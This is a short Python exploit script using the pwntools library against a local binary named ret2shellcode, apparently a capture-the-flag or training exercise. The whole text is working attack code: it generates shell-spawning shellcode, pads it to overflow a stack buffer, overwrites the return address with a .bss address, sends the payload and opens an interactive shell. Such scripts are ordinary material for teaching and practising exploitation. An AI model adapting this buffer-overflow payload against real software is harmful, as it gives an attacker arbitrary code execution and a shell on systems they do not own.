from pwn import *
r = process('/tmp/ret2shellcode')
bss_addr = 0x0804a080
shellcode = asm(shellcraft.sh())
#r.sendline(shellcode+b'a'*(0x74+4-len(shellcode)) + p32(bss_addr))
payload = shellcode+b'a'*(0x88-8-16-len(shellcode))+p32(bss_addr)
#with open('/tmp/payload','wb') as f:
#    f.write(payload)
r.sendline(payload)
r.interactive()
